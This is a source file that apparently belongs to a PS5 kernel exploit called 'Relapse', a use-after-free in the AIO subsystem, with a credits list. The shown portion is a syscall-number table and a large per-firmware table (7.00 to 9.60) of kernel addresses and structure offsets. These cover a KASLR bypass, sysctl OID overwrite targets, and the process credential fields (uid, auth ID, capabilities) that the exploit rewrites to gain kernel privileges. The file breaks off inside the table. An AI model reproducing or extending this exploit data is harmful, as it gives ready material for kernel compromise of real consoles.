// Relapse PS5 Kernel Exploit (UAF via AIO)
// Native/Fast Port by notmaj0r
// Credits: ntfargo, ufm42, Sonic_Iso, Jordy, Dr. Yenyen, TheFlow, SlidyBat, Flatz,
// cow, nhk, bollarz, Sleirsgoevy, EchoStretch, EarthOnion, matem6, edisnord

const SYSCALL_RELAPSE_EXTRA = {
    getrlimit: 0xC2n,
    setrlimit: 0xC3n,
    socketpair: 0x87n,
    pipe2: 0x2AFn,
    aio_multi_wait: 0x297n,
    aio_multi_poll: 0x298n,
    aio_multi_cancel: 0x29An,
    aio_submit_cmd: 0x29Dn,
    getpeername: 0x1Fn,
};
for (const k in SYSCALL_RELAPSE_EXTRA) {
    if (typeof SYSCALL !== "undefined" && !(k in SYSCALL)) {
        SYSCALL[k] = SYSCALL_RELAPSE_EXTRA[k];
    }
}

let KEXP_FILE = "@@KEXP_FILE@@";
let ELFLDR_FILE = "@@ELFLDR_FILE@@";

// Kernel offsets by firmware.
// FW 9.05 remains incompatible with Relapse - missing offsets.

const RELAPSE_OFFSETS = {
    "7.00": {
        kernelData: 0x00C50000n, allproc: 0x034A9D50n, rootvnode: 0x03D17510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00A83731n, retLow16: 0x3731n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x027706C8n, kind: 0x027706DCn, kindByte3: 0x027706DFn, arg1: 0x027706E0n, arg1Byte1: 0x027706E1n, arg1Value: 0x027706B8n, deadSink: 0x027706E8n },
            b: { base: 0x027705A0n, kind: 0x027705B4n, kindByte3: 0x027705B7n, arg1: 0x027705B8n, arg1Value: 0x027704D0n, visible: 0x027705F0n },
            c: { base: 0x02A92FA8n, kind: 0x02A92FBCn, arg1: 0x02A92FC0n, arg1Value: 0x03C93F3Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03C93F38n, mib: [9, 7] },
        nodeMutex: 0x01A6FE18n,
        rodataProbe: { rva: 0x01010A7An, text: "_aio_submit_cmd" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c38n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "7.01": {
        kernelData: 0x00C50000n, allproc: 0x034A9D50n, rootvnode: 0x03D17510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00A83731n, retLow16: 0x3731n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x027706C8n, kind: 0x027706DCn, kindByte3: 0x027706DFn, arg1: 0x027706E0n, arg1Byte1: 0x027706E1n, arg1Value: 0x027706B8n, deadSink: 0x027706E8n },
            b: { base: 0x027705A0n, kind: 0x027705B4n, kindByte3: 0x027705B7n, arg1: 0x027705B8n, arg1Value: 0x027704D0n, visible: 0x027705F0n },
            c: { base: 0x02A92FA8n, kind: 0x02A92FBCn, arg1: 0x02A92FC0n, arg1Value: 0x03C93F3Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03C93F38n, mib: [9, 7] },
        nodeMutex: 0x01A6FE18n,
        rodataProbe: { rva: 0x01010FA2n, text: "_aio_submit_cmd" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c38n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "7.20": {
        kernelData: 0x00C50000n, allproc: 0x034A9D50n, rootvnode: 0x03D17510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00A83B81n, retLow16: 0x3B81n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x02770788n, kind: 0x0277079Cn, kindByte3: 0x0277079Fn, arg1: 0x027707A0n, arg1Byte1: 0x027707A1n, arg1Value: 0x02770778n, deadSink: 0x027707A8n },
            b: { base: 0x02770660n, kind: 0x02770674n, kindByte3: 0x02770677n, arg1: 0x02770678n, arg1Value: 0x02770590n, visible: 0x027706B0n },
            c: { base: 0x02A93068n, kind: 0x02A9307Cn, arg1: 0x02A93080n, arg1Value: 0x03C93F7Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03C93F78n, mib: [9, 7] },
        nodeMutex: 0x01A6FED8n,
        rodataProbe: { rva: 0x01010B71n, text: "_aio_submit_cmd" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c38n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "7.40": {
        kernelData: 0x00C50000n, allproc: 0x034A9D50n, rootvnode: 0x03D17510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00A83B81n, retLow16: 0x3B81n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x02770788n, kind: 0x0277079Cn, kindByte3: 0x0277079Fn, arg1: 0x027707A0n, arg1Byte1: 0x027707A1n, arg1Value: 0x02770778n, deadSink: 0x027707A8n },
            b: { base: 0x02770660n, kind: 0x02770674n, kindByte3: 0x02770677n, arg1: 0x02770678n, arg1Value: 0x02770590n, visible: 0x027706B0n },
            c: { base: 0x02A93068n, kind: 0x02A9307Cn, arg1: 0x02A93080n, arg1Value: 0x03C93F7Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03C93F78n, mib: [9, 7] },
        nodeMutex: 0x01A6FED8n,
        rodataProbe: { rva: 0x010110B6n, text: "_aio_submit_cmd" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c38n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "7.60": {
        kernelData: 0x00C50000n, allproc: 0x034A9D50n, rootvnode: 0x03D17510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00A84191n, retLow16: 0x4191n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x02770808n, kind: 0x0277081Cn, kindByte3: 0x0277081Fn, arg1: 0x02770820n, arg1Byte1: 0x02770821n, arg1Value: 0x027707F8n, deadSink: 0x02770828n },
            b: { base: 0x027706E0n, kind: 0x027706F4n, kindByte3: 0x027706F7n, arg1: 0x027706F8n, arg1Value: 0x02770610n, visible: 0x02770730n },
            c: { base: 0x02A930E8n, kind: 0x02A930FCn, arg1: 0x02A93100n, arg1Value: 0x03C93F7Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03C93F78n, mib: [9, 7] },
        nodeMutex: 0x01A6FED8n,
        rodataProbe: { rva: 0x01010BCAn, text: "_aio_submit_cmd" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c38n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "7.61": {
        kernelData: 0x00C50000n, allproc: 0x034A9D50n, rootvnode: 0x03D17510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00A84191n, retLow16: 0x4191n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x02770808n, kind: 0x0277081Cn, kindByte3: 0x0277081Fn, arg1: 0x02770820n, arg1Byte1: 0x02770821n, arg1Value: 0x027707F8n, deadSink: 0x02770828n },
            b: { base: 0x027706E0n, kind: 0x027706F4n, kindByte3: 0x027706F7n, arg1: 0x027706F8n, arg1Value: 0x02770610n, visible: 0x02770730n },
            c: { base: 0x02A930E8n, kind: 0x02A930FCn, arg1: 0x02A93100n, arg1Value: 0x03C93F7Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03C93F78n, mib: [9, 7] },
        nodeMutex: 0x01A6FED8n,
        rodataProbe: { rva: 0x0101114Fn, text: "_aio_submit_cmd" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c38n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "8.00": {
        kernelData: 0x00C70000n, allproc: 0x034E5D50n, rootvnode: 0x03D6B510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00A9CAC5n, retLow16: 0xCAC5n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x027914E8n, kind: 0x027914FCn, kindByte3: 0x027914FFn, arg1: 0x02791500n, arg1Byte1: 0x02791501n, arg1Value: 0x027914D8n, deadSink: 0x02791508n },
            b: { base: 0x027913C0n, kind: 0x027913D4n, kindByte3: 0x027913D7n, arg1: 0x027913D8n, arg1Value: 0x027912F0n, visible: 0x02791410n },
            c: { base: 0x02AB3DC8n, kind: 0x02AB3DDCn, arg1: 0x02AB3DE0n, arg1Value: 0x03CE7F7Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03CE7F78n, mib: [9, 7] },
        nodeMutex: 0x01A8FF48n,
        rodataProbe: { rva: 0x010254E9n, text: "_aio_submit_cmd" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c38n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "8.20": {
        kernelData: 0x00C70000n, allproc: 0x034E5D50n, rootvnode: 0x03D6B510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00A9DEC5n, retLow16: 0xDEC5n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x027913A8n, kind: 0x027913BCn, kindByte3: 0x027913BFn, arg1: 0x027913C0n, arg1Byte1: 0x027913C1n, arg1Value: 0x02791398n, deadSink: 0x027913C8n },
            b: { base: 0x02791280n, kind: 0x02791294n, kindByte3: 0x02791297n, arg1: 0x02791298n, arg1Value: 0x027911B0n, visible: 0x027912D0n },
            c: { base: 0x02AB3C88n, kind: 0x02AB3C9Cn, arg1: 0x02AB3CA0n, arg1Value: 0x03CE7F7Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03CE7F78n, mib: [9, 7] },
        nodeMutex: 0x01A8FF48n,
        rodataProbe: { rva: 0x0102527Fn, text: "_aio_submit_cmd" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c38n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "8.40": {
        kernelData: 0x00C70000n, allproc: 0x034E5D50n, rootvnode: 0x03D6B510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00A9E155n, retLow16: 0xE155n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x027913A8n, kind: 0x027913BCn, kindByte3: 0x027913BFn, arg1: 0x027913C0n, arg1Byte1: 0x027913C1n, arg1Value: 0x02791398n, deadSink: 0x027913C8n },
            b: { base: 0x02791280n, kind: 0x02791294n, kindByte3: 0x02791297n, arg1: 0x02791298n, arg1Value: 0x027911B0n, visible: 0x027912D0n },
            c: { base: 0x02AB3C88n, kind: 0x02AB3C9Cn, arg1: 0x02AB3CA0n, arg1Value: 0x03CE7F7Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03CE7F78n, mib: [9, 7] },
        nodeMutex: 0x01A8FF48n,
        rodataProbe: { rva: 0x01024D9Fn, text: "_aio_submit_cmd" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c38n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "8.60": {
        kernelData: 0x00C70000n, allproc: 0x034E5D50n, rootvnode: 0x03D6B510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00A9E3D5n, retLow16: 0xE3D5n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x027913A8n, kind: 0x027913BCn, kindByte3: 0x027913BFn, arg1: 0x027913C0n, arg1Byte1: 0x027913C1n, arg1Value: 0x02791398n, deadSink: 0x027913C8n },
            b: { base: 0x02791280n, kind: 0x02791294n, kindByte3: 0x02791297n, arg1: 0x02791298n, arg1Value: 0x027911B0n, visible: 0x027912D0n },
            c: { base: 0x02AB3C88n, kind: 0x02AB3C9Cn, arg1: 0x02AB3CA0n, arg1Value: 0x03CE7F7Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03CE7F78n, mib: [9, 7] },
        nodeMutex: 0x01A8FF48n,
        rodataProbe: { rva: 0x0102534Fn, text: "_aio_submit_cmd" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c38n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "9.00": {
        kernelData: 0x00CA0000n, allproc: 0x033F5D50n, rootvnode: 0x03C7B510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00AC1451n, retLow16: 0x1451n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x02787AB8n, kind: 0x02787ACCn, kindByte3: 0x02787ACFn, arg1: 0x02787AD0n, arg1Byte1: 0x02787AD1n, arg1Value: 0x02787AA8n, deadSink: 0x02787AD8n },
            b: { base: 0x02787990n, kind: 0x027879A4n, kindByte3: 0x027879A7n, arg1: 0x027879A8n, arg1Value: 0x027878C0n, visible: 0x027879E0n },
            c: { base: 0x02AAA678n, kind: 0x02AAA68Cn, arg1: 0x02AAA690n, arg1Value: 0x03BF8F3Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03BF8F38n, mib: [9, 7] },
        nodeMutex: 0x01A588E8n,
        rodataProbe: { rva: 0x0110791An, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c38n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "9.20": {
        kernelData: 0x00CA0000n, allproc: 0x033F5D50n, rootvnode: 0x03C7B510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00AC1471n, retLow16: 0x1471n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x02787AB8n, kind: 0x02787ACCn, kindByte3: 0x02787ACFn, arg1: 0x02787AD0n, arg1Byte1: 0x02787AD1n, arg1Value: 0x02787AA8n, deadSink: 0x02787AD8n },
            b: { base: 0x02787990n, kind: 0x027879A4n, kindByte3: 0x027879A7n, arg1: 0x027879A8n, arg1Value: 0x027878C0n, visible: 0x027879E0n },
            c: { base: 0x02AAA678n, kind: 0x02AAA68Cn, arg1: 0x02AAA690n, arg1Value: 0x03BF8F3Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03BF8F38n, mib: [9, 7] },
        nodeMutex: 0x01A588E8n,
        rodataProbe: { rva: 0x011077CFn, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c38n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "9.40": {
        kernelData: 0x00CA0000n, allproc: 0x033F5D50n, rootvnode: 0x03C7B510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00AC19E1n, retLow16: 0x19E1n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x02787AB8n, kind: 0x02787ACCn, kindByte3: 0x02787ACFn, arg1: 0x02787AD0n, arg1Byte1: 0x02787AD1n, arg1Value: 0x02787AA8n, deadSink: 0x02787AD8n },
            b: { base: 0x02787990n, kind: 0x027879A4n, kindByte3: 0x027879A7n, arg1: 0x027879A8n, arg1Value: 0x027878C0n, visible: 0x027879E0n },
            c: { base: 0x02AAA678n, kind: 0x02AAA68Cn, arg1: 0x02AAA690n, arg1Value: 0x03BF8F3Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03BF8F38n, mib: [9, 7] },
        nodeMutex: 0x01A588E8n,
        rodataProbe: { rva: 0x0110790Fn, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c38n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "9.60": {
        kernelData: 0x00CA0000n, allproc: 0x033F5D50n, rootvnode: 0x03C7B510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00AC1BC1n, retLow16: 0x1BC1n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x02787AB8n, kind: 0x02787ACCn, kindByte3: 0x02787ACFn, arg1: 0x02787AD0n, arg1Byte1: 0x02787AD1n, arg1Value: 0x02787AA8n, deadSink: 0x02787AD8n },
            b: { base: 0x02787990n, kind: 0x027879A4n, kindByte3: 0x027879A7n, arg1: 0x027879A8n, arg1Value: 0x027878C0n, visible: 0x027879E0n },
            c: { base: 0x02AAA678n, kind: 0x02AAA68Cn, arg1: 0x02AAA690n, arg1Value: 0x03BF8F3Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03BF8F38n, mib: [9, 7] },
        nodeMutex: 0x01A588E8n,
        rodataProbe: { rva: 0x01107BFAn, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c38n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
